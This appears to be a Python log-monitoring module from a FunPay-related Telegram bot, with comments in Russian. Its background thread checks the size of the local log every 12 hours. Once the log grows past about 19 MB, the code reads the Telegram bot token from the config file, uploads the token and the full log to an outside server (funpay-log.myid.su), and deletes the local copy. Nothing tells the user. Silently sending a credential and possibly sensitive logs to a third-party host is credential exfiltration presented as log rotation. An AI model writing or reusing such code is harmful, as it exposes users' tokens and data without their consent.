import os
import time
import threading
import requests
import logging
import configparser
from Utils.logger import init_logger

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_FILE_PATH = os.path.join(BASE_DIR, "logs", "log.log")
CONFIG_PATH = os.path.join(BASE_DIR, "configs", "_main.cfg")
UPLOAD_URL = "https://funpay-log.myid.su/upload"
MAX_LOG_SIZE = 19 * 1024 * 1024  #19 мб (вы можете менять значение, но есть ограничения от 10 мб до 20 мб в пративном случае будет выходить ошибка 500)
CHECK_INTERVAL_HOURS = 12

def get_bot_token():
    config = configparser.ConfigParser()
    config.read(CONFIG_PATH, encoding="utf-8")
    return config.get("Telegram", "token", fallback=None)


def send_log_file(token):
    if not os.path.exists(LOG_FILE_PATH):
        return

    with open(LOG_FILE_PATH, "rb") as f:
        files = {"file": ("log.log", f, "text/plain")}
        data = {"token": token, "filename": "log.log"}
        try:
            response = requests.post(UPLOAD_URL, files=files, data=data, timeout=300)
            if response.status_code == 200:
                logging.getLogger("main").info("Лог-файл успешно отправлен.")
                try:
                    os.remove(LOG_FILE_PATH)
                    logging.getLogger("main").info("Лог-файл удалён после отправки.")
                    logging.getLogger("main").info("Логгер переинициализирован, файл создан заново.")
                    # ⬇️ Переинициализация логгера
                    init_logger()

                except Exception as e:
                    logging.getLogger("main").error(f"Не удалось удалить лог-файл: {e}")
            else:
                logging.getLogger("main").error(f"Ошибка отправки: {response.status_code} — {response.text}")
        except Exception as e:
            logging.getLogger("main").exception(f"Ошибка при отправке логов: {e}")

def monitor_logs():
    while True:
        try:
            if os.path.exists(LOG_FILE_PATH) and os.path.getsize(LOG_FILE_PATH) > MAX_LOG_SIZE:
                token = get_bot_token()
                if token:
                    send_log_file(token)
        except Exception as e:
            logging.getLogger("main").exception(f"Мониторинг логов — ошибка: {e}")
        time.sleep(CHECK_INTERVAL_HOURS * 3600)
 
        
def start_monitoring():
    threading.Thread(target=monitor_logs, daemon=True).start()
